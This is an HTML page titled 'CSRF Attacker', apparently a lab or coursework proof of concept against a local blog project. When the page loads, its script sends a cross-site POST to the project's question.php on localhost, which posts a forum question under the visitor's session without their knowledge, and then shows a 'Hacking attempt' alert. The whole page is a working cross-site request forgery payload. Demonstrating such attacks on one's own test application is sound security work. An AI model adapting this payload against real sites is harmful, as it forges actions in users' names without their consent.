<!DOCTYPE html>
<html lang "en">
    <head>
        <meta charset="UTF-8">
        <title>CSRF Attacker</title>
    </head>
<body>
    <h1> HACKER SITE </h1>
    <br>
    <p>Malicious website containing code that makes the user post a question in the forum without his/her knowledge</p>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        $.ajax({
            'url': 'http://localhost/Your_blog_project_secure_version/question.php',
            'type': 'POST',
            'data': { 'question_title': 'Malicious question' }
        });
        alert('Hacking attempt ...')
    </script>
</body>
</html>

